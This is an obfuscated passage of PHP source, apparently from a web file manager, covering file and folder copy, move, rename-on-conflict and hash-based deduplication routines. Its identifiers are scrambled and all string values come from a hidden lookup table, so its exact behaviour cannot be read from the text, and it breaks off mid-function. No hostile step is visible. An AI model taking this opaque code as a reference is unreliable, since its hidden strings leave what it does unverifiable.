$ÎÅÒÚıÅ = array($ûğêËÜì[637] => array(), $ûğêËÜì[638] => array(), $ûğêËÜì[636] => array(), $ûğêËÜì[674] => array()); $¢ÈØ¬Š = $Ã­Ï©å¡ ? $Ã­Ï©å¡ : $ÙÙØ‘«¼->pathThis($µ²‚˜ ê); $ó°¯×Ù = $this->fileNameExist($ÙÇ²ôÔş, $¢ÈØ¬Š); $ »ª±Ş = $this->mkdir($ÙÇ²ôÔş, $¢ÈØ¬Š, $“¤ìÁøò); if (!$ó°¯×Ù || $“¤ìÁøò == REPEAT_RENAME_FOLDER) { $“¤ìÁøò = !1; } if ($ó°¯×Ù) { $this->_childrenAllMake($ó°¯×Ù); } Hook::trigger($ûğêËÜì[675]); $óáƒß¡á = KodIO::ioFileDriverGet($ûğêËÜì[485] . $ÙÇ²ôÔş . $ûğêËÜì[404]); $this->_copyChildTo($ÙÙØ‘«¼, $µ²‚˜ ê, $ »ª±Ş, $“¤ìÁøò, $ÎÅÒÚıÅ, $òİ••ùË, $óáƒß¡á); Hook::trigger($ûğêËÜì[676]); if ($ »ª±Ş) { $this->folderSizeResetChildren($ »ª±Ş); } $this->_childrenListClear(); Model($ûğêËÜì[639])->addAll($ÎÅÒÚıÅ[$ûğêËÜì[637]], array(), !0); Model($ûğêËÜì[640])->eventCopy($ »ª±Ş); $this->saveAll($ÎÅÒÚıÅ[$ûğêËÜì[638]]); Model($ûğêËÜì[548])->linkAdd($ÎÅÒÚıÅ[$ûğêËÜì[636]]); Model($ûğêËÜì[548])->remove($ÎÅÒÚıÅ[$ûğêËÜì[674]]); $this->folderSizeReset($ÙÇ²ôÔş); $this->updateModifyTime($ÙÇ²ôÔş); return $ »ª±Ş; } private function _copyChildTo($³Ãó—´, $ìˆÔñÁ, $»Û·óé¤, $¬äÏœ¢, &$Ê¥ÏÖÆ˜, $ØÆ»ğ¾‘, $õÄåƒæ«) { $´ğÇıï =& $_SERVER[¯‘·½]; $¾½—èÅ = $this->sourceInfoCache($»Û·óé¤); $Øù¬ıËÖ = $³Ãó—´->listPath($ìˆÔñÁ); $Øù¬ıËÖ = $Øù¬ıËÖ ? $Øù¬ıËÖ : array($´ğÇıï[86] => array(), $´ğÇıï[85] => array()); $¥£¥“Î = array_merge($Øù¬ıËÖ[$´ğÇıï[86]], $Øù¬ıËÖ[$´ğÇıï[85]]); $œşİÆıÈ = $this->_addFiles($³Ãó—´, $õÄåƒæ«, $Øù¬ıËÖ[$´ğÇıï[86]], $ØÆ»ğ¾‘); $«î¦âÂà = array(); foreach ($¥£¥“Î as &$›ÙÑ²) { if (isset($œşİÆıÈ[$›ÙÑ²[$´ğÇıï[32]]])) { $›ÙÑ² = $œşİÆıÈ[$›ÙÑ²[$´ğÇıï[32]]]; } $›ÙÑ²[$´ğÇıï[487]] = $›ÙÑ²[$´ğÇıï[33]] == $´ğÇıï[78]; $›ÙÑ²[$´ğÇıï[488]] = substr(_get($›ÙÑ², $´ğÇıï[169], $´ğÇıï[12]), 0, 10); $›ÙÑ²[$´ğÇıï[79]] = _get($›ÙÑ², $´ğÇıï[79], 0); $›ÙÑ²[$´ğÇıï[545]] = _get($›ÙÑ², $´ğÇıï[545], 0); if (!isset($›ÙÑ²[$´ğÇıï[677]]) && $›ÙÑ²[$´ğÇıï[545]]) { $Ê¥ÏÖÆ˜[$´ğÇıï[674]][] = $›ÙÑ²[$´ğÇıï[545]]; } if ($¬äÏœ¢) { $‰ÎŞ¤¤² = $this->fileNameExistCache($»Û·óé¤, $›ÙÑ²[$´ğÇıï[32]]); if ($‰ÎŞ¤¤²) { if ($›ÙÑ²[$´ğÇıï[487]] || $¬äÏœ¢ == REPEAT_SKIP) { continue; } if ($¬äÏœ¢ == REPEAT_REPLACE) { $ëùÏØöÑ = $this->sourceInfoCache($‰ÎŞ¤¤²); $ı³øÊ²Ï = $this->fileHistory($ëùÏØöÑ, $›ÙÑ²[$´ğÇıï[545]], $›ÙÑ²[$´ğÇıï[79]]); if ($ı³øÊ²Ï) { $Ê¥ÏÖÆ˜[$´ğÇıï[636]][] = $›ÙÑ²[$´ğÇıï[545]]; } continue; } else { if ($¬äÏœ¢ == REPEAT_RENAME) { $›ÙÑ²[$´ğÇıï[32]] = $this->fileNameAutoCache($»Û·óé¤, $›ÙÑ²[$´ğÇıï[32]], $¬äÏœ¢, !1); } } } } if (!$›ÙÑ²[$´ğÇıï[487]] && $›ÙÑ²[$´ğÇıï[545]] == 0) { continue; } if (!$›ÙÑ²[$´ğÇıï[487]] && $›ÙÑ²[$´ğÇıï[545]]) { $Ê¥ÏÖÆ˜[$´ğÇıï[636]][] = $›ÙÑ²[$´ğÇıï[545]]; } $«î¦âÂà[] = $this->_makeItemData($›ÙÑ², $¾½—èÅ, $›ÙÑ²[$´ğÇıï[32]]); } unset($›ÙÑ²); if (!empty($«î¦âÂà)) { $this->addAll($«î¦âÂà); $this->_childrenListSelect($»Û·óé¤); } $æÄª‹¬Œ = $this->_childrenList($»Û·óé¤); $æÄª‹¬Œ = array_to_keyvalue($æÄª‹¬Œ, $´ğÇıï[32]); foreach ($¥£¥“Î as $›ÙÑ²) { $ëùÏØöÑ = $æÄª‹¬Œ[$›ÙÑ²[$´ğÇıï[32]]]; $ àı ï  = $ëùÏØöÑ[$´ğÇıï[194]]; $this->_copyApplyMeta($ëùÏØöÑ, $Ê¥ÏÖÆ˜); if ($›ÙÑ²[$´ğÇıï[33]] == $´ğÇıï[78]) { $›ÙÑ²[$´ğÇıï[87]] = $³Ãó—´->getPathInner($›ÙÑ²[$´ğÇıï[87]]); $this->_copyChildTo($³Ãó—´, $›ÙÑ²[$´ğÇıï[87]], $ àı ï , $¬äÏœ¢, $Ê¥ÏÖÆ˜, $ØÆ»ğ¾‘, $õÄåƒæ«); } } } private function _addFiles($å“Ñ‘Ãñ, $“•Ğ„Êã, $Ó…°æµ, $ëæª‹¦) { $œÈÛî =& $_SERVER[¯‘·½]; if (!$Ó…°æµ || count($Ó…°æµ) == 0) { return array(); } $›ĞâßêÛ = array(); foreach ($Ó…°æµ as &$‘ÅÂ…) { Hook::trigger($œÈÛî[678], $‘ÅÂ…); $‘ÅÂ…[$œÈÛî[87]] = $å“Ñ‘Ãñ->getPathInner($‘ÅÂ…[$œÈÛî[87]]); $›‹Ú‹âÃ = $å“Ñ‘Ãñ->hashSimple($‘ÅÂ…[$œÈÛî[87]]); $ßÃ¤““ã = $å“Ñ‘Ãñ->hashMd5($‘ÅÂ…[$œÈÛî[87]]); if (strlen($ßÃ¤““ã) > 10 && !isset($›ĞâßêÛ[$ßÃ¤““ã])) { $›ĞâßêÛ[$ßÃ¤““ã] = array(); } $‘ÅÂ…[$œÈÛî[679]] = $›‹Ú‹âÃ; $‘ÅÂ…[$œÈÛî[551]] = $ßÃ¤““ã; $›ĞâßêÛ[$ßÃ¤““ã][] =& $‘ÅÂ…; if (count($›ĞâßêÛ[$ßÃ¤““ã]) > 1) { $‘ÅÂ…[$œÈÛî[677]] = !0; } Hook::trigger($œÈÛî[680], $‘ÅÂ…); } unset($‘ÅÂ…); $õæÃå¡Š = array($œÈÛî[551] => array($œÈÛî[7], array_keys($›ĞâßêÛ))); $³³ıà—Ä = Model($œÈÛî[681]); $îÜÓã § = $³³ıà—Ä->where($õæÃå¡Š)->select(); $îÜÓã § = $îÜÓã § ? $îÜÓã § : array(); foreach ($îÜÓã § as $ËÎëè»³) { if (!isset($›ĞâßêÛ[$ËÎëè»³[$œÈÛî[551]]])) { continue; } $‰½ÌŞÉ = $›ĞâßêÛ[$ËÎëè»³[$œÈÛî[551]]]; foreach ($‰½ÌŞÉ as &$‘ÅÂ…) { $‘ÅÂ…[$œÈÛî[545]] = $ËÎëè»³[$œÈÛî[545]]; $‘ÅÂ…[$œÈÛî[677]] = !0; } unset($‘ÅÂ…); } $Ò–·ĞÏ = array(); foreach ($Ó…°æµ as $ÀÅíß) { Hook::trigger($œÈÛî[682], $ÀÅíß); if (isset($ÀÅíß[$œÈÛî[677]]) && $ÀÅíß[$œÈÛî[677]]) { Hook::trigger($œÈÛî[683], $ÀÅíß); continue; } $øŞ©Ü” = $å“Ñ‘Ãñ->getPathInner($ÀÅíß[$œÈÛî[87]]); $‚¯ğ”˜İ = $³³ıà—Ä->addFileMake($øŞ©Ü”, $“•Ğ„Êã, $ÀÅíß[$œÈÛî[79]], $ÀÅíß[$œÈÛî[679]], $ÀÅíß[$œÈÛî[551]], $ÀÅíß[$œÈÛî[32]], $ëæª‹¦); Hook::trigger($œÈÛî[683], $ÀÅíß); if (!is_array($‚¯ğ”˜İ)) { continue; } $Ò–·ĞÏ[] = $‚¯ğ”˜İ; } $³³ıà—Ä->addAll($Ò–·ĞÏ); $õæÃå¡Š = array($œÈÛî[551] => array($œÈÛî[7], array_keys($›ĞâßêÛ))); $îÜÓã § = $³³ıà—Ä->where($õæÃå¡Š)->select(); $îÜÓã § = $îÜÓã § ? $îÜÓã § : array(); foreach ($îÜÓã § as $ËÎëè»³) { if (!isset($›ĞâßêÛ[$ËÎëè»³[$œÈÛî[551]]])) { continue; } $õœ¶‘½Ğ =& $›ĞâßêÛ[$ËÎëè»³[$œÈÛî[551]]]; foreach ($õœ¶‘½Ğ as &$‘ÅÂ…) { $‘ÅÂ…[$œÈÛî[545]] = $ËÎëè»³[$œÈÛî[545]]; } unset($‘ÅÂ…); } $¢à´Ü°î = array(); foreach ($Ó…°æµ as $äÅú„ÂÈ) { $¢à´Ü°î[$äÅú„ÂÈ[$œÈÛî[32]]] = $äÅú„ÂÈ; } return $¢à´Ü°î; } } define($_SERVER[¯‘·½][684], $_SERVER[¯‘·½][685]); $hsajzptcun = $_SERVER[¯‘·½][686]; goto Fóò­´»‘Ë; Bê‰ææÏ’: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Š¼ºó—, $¸£º”ö) { $äÖÍ‡ã„ =& $_SERVER[¯‘·½]; $ø¡óì´Ğ = $¸£º”ö; $GLOBALS[$äÖÍ‡ã„[1248]] = $äÖÍ‡ã„[1249] . $Š¼ºó—; Hook::trigger($äÖÍ‡ã„[1249] . $Š¼ºó— . $äÖÍ‡ã„[1250], $ø¡óì´Ğ); $å·ª§¶Ê = self::driverMake($¸£º”ö[0]); if (!$å·ª§¶Ê) { return !1; } if ($Š¼ºó— == $äÖÍ‡ã„[625] || $Š¼ºó— == $äÖÍ‡ã„[627] || $Š¼ºó— == $äÖÍ‡ã„[1251]) { if (!trim($å·ª§¶Ê->path . $äÖÍ‡ã„[456], $äÖÍ‡ã„[8])) { return !1; } } if (method_exists($å·ª§¶Ê, $Š¼ºó—)) { $ÔşÂ¡òŒ = @call_user_func_array(array($å·ª§¶Ê, $Š¼ºó—), $¸£º”ö); } else { if (method_exists($å·ª§¶Ê, $äÖÍ‡ã„[1252])) { $ÔşÂ¡òŒ = @call_user_func_array(array($å·ª§¶Ê, $Š¼ºó—), $¸£º”ö); } else { if (method_exists(self, $Š¼ºó—)) { $ÔşÂ¡òŒ = @call_user_func_array(array(self, $Š¼ºó—), $¸£º”ö); } else { $ÔşÂ¡òŒ = call_user_func_array(array(parent, $Š¼ºó—), $¸£º”ö); } } } Hook::trigger($äÖÍ‡ã„[1249] . $Š¼ºó— . $äÖÍ‡ã„[1253], $ø¡óì´Ğ, $ÔşÂ¡òŒ); return $ÔşÂ¡òŒ; } public static function init($Ïö«Ô) { return self::driverMake($Ïö«Ô); } public static function copy($ã‹–ªÚø, $é®ıµ×ƒ, $ñÉßÎñÓ = false, $¨ßÊö‚È = false) { return self::copyMoveStart($ã‹–ªÚø, $é®ıµ×ƒ, $ñÉßÎñÓ, $_SERVER[¯‘·½][625], $¨ßÊö‚È); } public static function move($÷½Ö‘õ, $Å÷Ì¢äˆ, $à¸œ…Û‹ = false, $Ù«Œœ¨ = false) { return self::copyMoveStart($÷½Ö‘õ, $Å÷Ì¢äˆ, $à¸œ…Û‹, $_SERVER[¯‘·½][627], $Ù«Œœ¨); } public static function copyMoveChildren($ßëÁ„‰ï, $ğÒ¨œ¯å, $·ô…”À = "\x63\x6f\x70\x79", $…êÙ÷é = REPEAT_REPLACE) { $ˆÃÌ‚äƒ =& $_SERVER[¯‘·½]; $åû”­•‘ = $ßëÁ„‰ï; $˜“Îğ = self::driverMake($ßëÁ„‰ï); $™¿¯æÛ = $˜“Îğ->listPath($ßëÁ„‰ï, !0); $Ï°½ñâ­ = array_merge($™¿¯æÛ[$ˆÃÌ‚äƒ[86]], $™¿¯æÛ[$ˆÃÌ‚äƒ[85]]); foreach ($Ï°½ñâ­ as $ãıáé´) { self::copyMoveStart($ãıáé´[$ˆÃÌ‚äƒ[87]], $ğÒ¨œ¯å, $…êÙ÷é, $·ô…”À, !1); } if ($·ô…”À == $ˆÃÌ‚äƒ[627]) { self::remove($åû”­•‘); } } private static function copyMoveStart($™ÖŒİ’’, $£¥óİƒÅ, $îïÂ­, $µÚÒ¯ØÑ, $Ÿ¡çû™‰) { $ÍûòÉ¨™ =& $_SERVER[¯‘·½]; $ôÜ„©‡ª = array($™ÖŒİ’’, $£¥óİƒÅ, $îïÂ­, $Ÿ¡çû™‰); Hook::trigger($ÍûòÉ¨™[1249] . $µÚÒ¯ØÑ . $ÍûòÉ¨™[1250], $ôÜ„©‡ª); $™¢«¡´ş = self::copyMove($™ÖŒİ’’, $£¥óİƒÅ, $îïÂ­, $µÚÒ¯ØÑ, $Ÿ¡çû™‰); Hook::trigger($ÍûòÉ¨™[1249] . $µÚÒ¯ØÑ . $ÍûòÉ¨™[1253], $ôÜ„©‡ª, $™¢«¡´ş); return $™¢«¡´ş; } public static function saveFile($Ø†™³¨ğ, $§¶€Ñ“¥, $‰ŠË»Éİ = true) { $ñö²“´ı =& $_SERVER[¯‘·½]; $£ûğ÷Æš = self::info($§¶€Ñ“¥); $ ëö…§¶ = self::driverMake($Ø†™³¨ğ); $ŒğÛè ê = self::driverMake($§¶€Ñ“¥); $ñØì¡œ = !1; if ($ŒğÛè ê->pathParse[$ñö²“´ı[1254]]) { $ñØì¡œ = $ŒğÛè ê; $×¥€õÖ‚ = $ŒğÛè ê->pathParse[$ñö²“´ı[1254]]; $ŒğÛè ê = self::driverMake($×¥€õÖ‚); } if ($ ëö…§¶->pathParse[$ñö²“´ı[1254]]) { $ÑíÔÆóô = $ ëö…§¶->pathParse[$ñö²“´ı[1254]]; $ ëö…§¶ = self::driverMake($ÑíÔÆóô); } $ÇÎ‡Ú = $ŒğÛè ê->pathFather($§¶€Ñ“¥); $êÈçş‘À = !0; if (!$‰ŠË»Éİ && self::driverIsSame($ ëö…§¶, $ŒğÛè ê)) { $êÈçş‘À = !1; } $§²á¦üà = self::copyFile($ ëö…§¶, $Ø†™³¨ğ, $ŒğÛè ê, $ÇÎ‡Ú, $£ûğ÷Æš[$ñö²“´ı[32]], $êÈçş‘À); if ($ñØì¡œ) { $§²á¦üà = $ñØì¡œ->getPathOuter($§²á¦üà); } return $§²á¦üà; } private static function copyMove($ŠÅ´¹§ï, $îÔÉƒ‚, $»ê€Éß€, $£ûÒĞ›, $ÕöªÑı¾ = false) { $ôÄ€‹Öò =& $_SERVER[¯‘·½]; if (!$ŠÅ´¹§ï || $ŠÅ´¹§ï == $ôÄ€‹Öò[8] || !$îÔÉƒ‚) { return !1; } ignore_timeout(); $ŞªÜğ“à = self::driverMake($ŠÅ´¹§ï); $÷¢˜¯Âê = self::driverMake($îÔÉƒ‚); $ÜÙŒ¶ó¶ = $£ûÒĞ› == $ôÄ€‹Öò[627]; $ ‘Ê…­Š = !1; if ($÷¢˜¯Âê->pathParse[$ôÄ€‹Öò[1254]]) { $ ‘Ê…­Š = $÷¢˜¯Âê; $îÔÉƒ‚ = $÷¢˜¯Âê->pathParse[$ôÄ€‹Öò[1254]]; $÷¢˜¯Âê = self::driverMake($îÔÉƒ‚); } if ($ŞªÜğ“à->pathParse[$ôÄ€‹Öò[1254]]) { $ŠÅ´¹§ï = $ŞªÜğ“à->pathParse[$ôÄ€‹Öò[1254]]; $ŞªÜğ“à = self::driverMake($ŠÅ´¹§ï); } self::check($ŞªÜğ“à, $ŠÅ´¹§ï, $÷¢˜¯Âê, $îÔÉƒ‚); Hook::trigger($ôÄ€‹Öò[1255], $ŞªÜğ“à, $ŠÅ´¹§ï, $÷¢˜¯Âê, $îÔÉƒ‚); $–ˆäÃñÊ = self::driverIsSame($ŞªÜğ“à, $÷¢˜¯Âê); if ($–ˆäÃñÊ) { if ($£ûÒĞ› == $ôÄ€‹Öò[627] && !method_exists($÷¢˜¯Âê, $ôÄ€‹Öò[1256]) && trim($îÔÉƒ‚, $ôÄ€‹Öò[8]) == trim($÷¢˜¯Âê->pathFather($ŠÅ´¹§ï), $ôÄ€‹Öò[8])) { if ($ŞªÜğ“à->pathThis($ŠÅ´¹§ï) != $ÕöªÑı¾ && !$ŞªÜğ“à->isOsDriver()) { return $ŞªÜğ“à->rename($ŠÅ´¹§ï, $ÕöªÑı¾); } return $÷¢˜¯Âê->getPathOuter($ŠÅ´¹§ï); } if (method_exists($÷¢˜¯Âê, $£ûÒĞ›)) { return $÷¢˜¯Âê->{$£ûÒĞ›}($ŠÅ´¹§ï, $îÔÉƒ‚, $»ê€Éß€, $ÕöªÑı¾); } } if ($–ˆäÃñÊ && $£ûÒĞ› == $ôÄ€‹Öò[627] && $÷¢˜¯Âê->getType() == $ôÄ€‹Öò[109]) { $¦¸Æíñ¶ = $÷¢˜¯Âê->movePath($ŠÅ´¹§ï, $îÔÉƒ‚, $ÕöªÑı¾); if ($¦¸Æíñ¶) { return $¦¸Æíñ¶; } } $°õÃ”ê = $ŞªÜğ“à->isFile($ŠÅ´¹§ï); if (!$°õÃ”ê && $÷¢˜¯Âê->getType() == $ôÄ€‹Öò[843] && $ŞªÜğ“à->getType() == $ôÄ€‹Öò[109]) { $¦¸Æíñ¶ = $÷¢˜¯Âê->copyFolderFromIO($ŞªÜğ“à, $ŠÅ´¹§ï, $îÔÉƒ‚, $»ê€Éß€, $ÜÙŒ¶ó¶, $ÕöªÑı¾); } else { $¦¸Æíñ¶ = self::copyPath($ŞªÜğ“à, $ŠÅ´¹§ï, $÷¢˜¯Âê, $îÔÉƒ‚, $»ê€Éß€, $ÜÙŒ¶ó¶, $°õÃ”ê, $ÕöªÑı¾); } if ($¦¸Æíñ¶ && $ÜÙŒ¶ó¶) { $ŞªÜğ“à->remove($ŠÅ´¹§ï); } if ($ ‘Ê…­Š) { $¦¸Æíñ¶ = $ ‘Ê…­Š->getPathOuter($¦¸Æíñ¶); } return $¦¸Æíñ¶; } private static function check($®Û÷¢æ, $•–¡‹·, $ËÂİé¸½, &$Á’Í—¯) { $ìğèÍğî =& $_SERVER[¯‘·½]; if (self::driverIsSame($®Û÷¢æ, $ËÂİé¸½) && $®Û÷¢æ->isFolder($•–¡‹·) && $®Û÷¢æ->isParentOf($•–¡‹·, $Á’Í—¯)) { show_json(LNG($ìğèÍğî[1257]), !1); } if (!$®Û÷¢æ->exist($•–¡‹·)) { show_json(LNG($ìğèÍğî[108]), !1); } } private static function copyPath($Š½¤˜è¤, $Æ‹±óşÈ, $ˆ¢§ëÀ, $ÒÎø¬®è, $‰Óª“´, $™»ùàäå, $µ§®¡±, $ÚëÊ‘È¿ = false, $çÇ«úİØ = true) { $œ“İ€‚û =& $_SERVER[¯‘·½]; $Ó¾³†ˆâ = empty($ÚëÊ‘È¿) && $ÚëÊ‘È¿ !== $œ“İ€‚û[231] ? $Š½¤˜è¤->pathThis($Æ‹±óşÈ) : $ÚëÊ‘È¿; if ($‰Óª“´) { $Ö¾Ì‹—‰ = $ˆ¢§ëÀ->fileNameExist($ÒÎø¬®è, $Ó¾³†ˆâ); $÷—¯€ƒÌ = $Ó¾³†ˆâ; $Ó¾³†ˆâ = $ˆ¢§ëÀ->fileNameAuto($ÒÎø¬®è, $Ó¾³†ˆâ, $‰Óª“´, !$µ§®¡±); if (!$Ö¾Ì‹—‰ || $÷—¯€ƒÌ != $Ó¾³†ˆâ) { $‰Óª“´ = !1; } if ($çÇ«úİØ && !$‰Óª“´) { $ˆ¢§ëÀ->_data[$œ“İ€‚û[1258]] = !0; } } if ($µ§®¡±) { return self::copyFile($Š½¤˜è¤, $Æ‹±óşÈ, $ˆ¢§ëÀ, $ÒÎø¬®è, $Ó¾³†ˆâ, $™»ùàäå); } if ($‰Óª“´ == REPEAT_RENAME_FOLDER) { $‰Óª“´ = !1; } $å¯ÂÖÀ® = rtrim($ÒÎø¬®è, $œ“İ€‚û[8]) . $œ“İ€‚û[8] . $Ó¾³†ˆâ; $‘‘«°‡¬ = $ˆ¢§ëÀ->mkdir($ˆ¢§ëÀ->getPath($å¯ÂÖÀ®), $‰Óª“´); $ÒÎø¬®è = $ˆ¢§ëÀ->getPathInner($‘‘«°‡¬); $í°¿Ç­– = $Š½¤˜è¤->listPath($Æ‹±óşÈ, !0); $í°¿Ç­– = is_array($í°¿Ç­–) ? $í°¿Ç­– : array($œ“İ€‚û[86] => array(), $œ“İ€‚û[85] => array()); $³¥Çï— = array_merge($í°¿Ç­–[$œ“İ€‚û[86]], $í°¿Ç­–[$œ“İ€‚û[85]]); foreach ($³¥Çï— as $Îƒü½˜´) { $…îÆ¡™ = $Îƒü½˜´[$œ“İ€‚û[33]] == $œ“İ€‚û[233]; $Æ‹±óşÈ = $Š½¤˜è¤->getPathInner($Îƒü½˜´[$œ“İ€‚û[87]]); $“Âìïü° = self::copyPath($Š½¤˜è¤, $Æ‹±óşÈ, $ˆ¢§ëÀ, $ÒÎø¬®è, $‰Óª“´, $™»ùàäå, $…îÆ¡™, !1, !1); if (!$“Âìïü°) { IO::errorTips($œ“İ€‚û[1259] . $Æ‹±óşÈ . $œ“İ€‚û[73] . $ÒÎø¬®è); } } self::copyMoveKeepInfo($Š½¤˜è¤, $Æ‹±óşÈ, $‘‘«°‡¬); return $‘‘«°‡¬; } private static function copyFile($½æ½•Èã, $ô¨ÚÒè, $ÛÊ™ä­°, $ÅŞ…‰©, $ÏìÃôÆ, $ä‘­Ñ) { $±øıÈĞ— =& $_SERVER[¯‘·½]; $ÅŞ…‰© = $ÛÊ™ä­°->getPath(rtrim($ÅŞ…‰©, $±øıÈĞ—[8]) . $±øıÈĞ—[8] . $ÏìÃôÆ); $¶ßÊ§Ö¾ = $±øıÈĞ—[1260] . time() . rand_string(5); Hook::trigger($±øıÈĞ—[1261], $½æ½•Èã, $ô¨ÚÒè, $ÛÊ™ä­°, $ÅŞ…‰©, $ÏìÃôÆ, $¶ßÊ§Ö¾); if (self::driverIsSame($½æ½•Èã, $ÛÊ™ä­°)) { if ($ä‘­Ñ) { $Û©¥¤ÙÒ = $ÛÊ™ä­°->moveFile($ô¨ÚÒè, $ÅŞ…‰©); } else { $Û©¥¤ÙÒ = $ÛÊ™ä­°->copyFile($ô¨ÚÒè, $ÅŞ…‰©); } Hook::trigger($±øıÈĞ—[1262], $½æ½•Èã, $ô¨ÚÒè, $ÛÊ™ä­°, $ÅŞ…‰©, $ÏìÃôÆ, $Û©¥¤ÙÒ); self::copyMoveKeepInfo($½æ½•Èã, $ô¨ÚÒè, $Û©¥¤ÙÒ); return $Û©¥¤ÙÒ; } $ÛüøğœÇ = TEMP_FILES; if ($GLOBALS[$±øıÈĞ—[6]][$±øıÈĞ—[92]][$±øıÈĞ—[884]]) { $ÛüøğœÇ = $GLOBALS[$±øıÈĞ—[6]][$±øıÈĞ—[92]][$±øıÈĞ—[884]]; } $à¿ÌÈ = $ÛüøğœÇ; mk_dir($à¿ÌÈ); $†µØ…íº = $à¿ÌÈ . $¶ßÊ§Ö¾; $”õÈ“šê = $†µØ…íº; $†µØ…íº = $½æ½•Èã->download($ô¨ÚÒè, $†µØ…íº); $†µØ…íº = $½æ½•Èã->iconvApp($†µØ…íº); if (substr($†µØ…íº, strlen($ÛüøğœÇ)) == $ÛüøğœÇ) { $ä‘­Ñ = !0; } $Û©¥¤ÙÒ = $ÛÊ™ä­°->upload($ÅŞ…‰©, $†µØ…íº, $ä‘­Ñ); self::remove($”õÈ“šê); Hook::trigger($±øıÈĞ—[1262], $½æ½•Èã, $ô¨ÚÒè, $ÛÊ™ä­°, $ÅŞ…‰©, $ÏìÃôÆ, $Û©¥¤ÙÒ); self::copyMoveKeepInfo($½æ½•Èã, $ô¨ÚÒè, $Û©¥¤ÙÒ); return $Û©¥¤ÙÒ; } private static function copyMoveKeepInfo($ÅÑª„äİ, $ßºüìÄ·, $†œÍæë) { if (!$†œÍæë) { return; } $Õ©îîÙÓ = $ÅÑª„äİ->info($ßºüìÄ·); if (!is_array($Õ©îîÙÓ)) { return; } IO::setModifyTime($†œÍæë, $Õ©îîÙÓ[$_SERVER[¯‘·½][88]]); } public static function pathFather($–ö˜Áâ­) { $„¸ÇÖªî = IO::init($–ö˜Áâ­); $¬‡É†ûØ = $„¸ÇÖªî->pathFather($„¸ÇÖªî->path); return $„¸ÇÖªî->getPathOuter($¬‡É†ûØ); } public static function fileOut($­Ş½Å²ê, $í£ü¦¶ = false, $Ğú×Âß½ = false, $˜öá¦”ı = '') { $Á¬Ÿ¿Û‘ = self::driverMake($­Ş½Å²ê); if ($Á¬Ÿ¿Û‘->isFileOutServer()) { return $Á¬Ÿ¿Û‘->fileOutServer($­Ş½Å²ê, $í£ü¦¶, $Ğú×Âß½, $˜öá¦”ı); } return $Á¬Ÿ¿Û‘->fileOut($­Ş½Å²ê, $í£ü¦¶, $Ğú×Âß½, $˜öá¦”ı); } public static function fileOutImage($¤­Æûï‰, $æ”éğ © = 250) { $óµõ›† = array(250, 600, 1200, 2000, 3000, 5000); for ($ïÂ³ÛÕå = 0; $ïÂ³ÛÕå < count($óµõ›†); $ïÂ³ÛÕå++) { if ($ïÂ³ÛÕå == 0 && $æ”éğ © <= $óµõ›†[$ïÂ³ÛÕå]) { $æ”éğ © = $óµõ›†[$ïÂ³ÛÕå]; break; } else { if ($æ”éğ © > $óµõ›†[$ïÂ³ÛÕå - 1] && $æ”éğ © <= $óµõ›†[$ïÂ³ÛÕå]) { $æ”éğ © = $óµõ›†[$ïÂ³ÛÕå]; break; } else { if ($ïÂ³ÛÕå == count($óµõ›†) - 1 && $æ”éğ © > $óµõ›†[$ïÂ³ÛÕå]) { $æ”éğ © = $óµõ›†[$ïÂ³ÛÕå]; break; } } } } $À½Ñçë¡ = self::driverMake($¤­Æûï‰); if ($À½Ñçë¡->isFileOutServer()) { return $À½Ñçë¡->fileOutImageServer($¤­Æûï‰, $æ”éğ ©); } return $À½Ñçë¡->fileOutImage($¤­Æûï‰, $æ”éğ ©); } private static function driverIsSame($ÁÅ—à‰¼, $Ÿ†÷òä) { $›–Ã¸ =& $_SERVER[¯‘·½]; $Âê§Ó–ƒ = $ÁÅ—à‰¼->getType(); $“»ñĞ© = $Ÿ†÷òä->getType(); if ($Âê§Ó–ƒ != $“»ñĞ©) { return !1; } if ($Âê§Ó–ƒ == $›–Ã¸[843]) { return !0; } if ($Âê§Ó–ƒ == $›–Ã¸[109]) { return !0; } if ($ÁÅ—à‰¼->pathDriver == $Ÿ†÷òä->pathDriver) { return !0; } return !1; } public static function copyUpdate($õ€¢„ß, $¬Òª‚ø) { $‹€€¶ä’ =& $_SERVER[¯‘·½]; if (!IO::exist($õ€¢„ß)) { return !1; } if (!IO::exist($¬Òª‚ø)) { IO::mkdir($¬Òª‚ø); } $ùß¡ÌÕ = array_to_keyvalue(self::listAllSimple($õ€¢„ß), $‹€€¶ä’[87]); $»Ò¿É™õ = array_to_keyvalue(self::listAllSimple($¬Òª‚ø), $‹€€¶ä’[87]); $Êæ»·ûÓ = array(); $¸ôÔÃã = array(); foreach ($ùß¡ÌÕ as $³ïóîƒğ => $ã»«ÁÒœ) { if (isset($»Ò¿É™õ[$³ïóîƒğ])) { if ($ã»«ÁÒœ[$‹€€¶ä’[78]] == 1) { continue; } if ($»Ò¿É™õ[$³ïóîƒğ][$‹€€¶ä’[79]] == $ã»«ÁÒœ[$‹€€¶ä’[79]]) { continue; } } if ($ã»«ÁÒœ[$‹€€¶ä’[78]] == 1) { $¸ôÔÃã[] = $¬Òª‚ø . $‹€€¶ä’[8] . trim($³ïóîƒğ, $‹€€¶ä’[8]); continue; } $ì›¤¢ƒ = strstr(trim($³ïóîƒğ, $‹€€¶ä’[8]), $‹€€¶ä’[8]) ? get_path_father($³ïóîƒğ) : $‹€€¶ä’[12]; $Êæ»·ûÓ[] = array($‹€€¶ä’[1263] => $ã»«ÁÒœ[$‹€€¶ä’[89]], $‹€€¶ä’[1264] => rtrim($¬Òª‚ø, $‹€€¶ä’[8]) . $‹€€¶ä’[8] . $ì›¤¢ƒ, $‹€€¶ä’[1265] => $ã»«ÁÒœ); } $µÆû«°Ë = array($‹€€¶ä’[233] => $Êæ»·ûÓ, $‹€€¶ä’[78] => $¸ôÔÃã); Hook::trigger($‹€€¶ä’[1266], $õ€¢„ß, $¬Òª‚ø, $µÆû«°Ë); foreach ($¸ôÔÃã as $ã»«ÁÒœ) { IO::mkdir($ã»«ÁÒœ); } foreach ($Êæ»·ûÓ as $ã»«ÁÒœ) { IO::copy($ã»«ÁÒœ[$‹€€¶ä’[1263]], $ã»«ÁÒœ[$‹€€¶ä’[1264]], REPEAT_REPLACE); } } public static function fileSubstr($íÛ±åşš, $‡êÅ°úŞ, $²¤øö†ß = false) { $•ŸÏê“Ì =& $_SERVER[¯‘·½]; $ßşÍÅ¦ = self::driverMake($íÛ±åşš); $²ÅÕÙ‘Û = $ßşÍÅ¦->size($íÛ±åşš); $óìæ­© = $‡êÅ°úŞ; $´­“Í¾ = $²¤øö†ß; if ($‡êÅ°úŞ < 0) { $‡êÅ°úŞ = 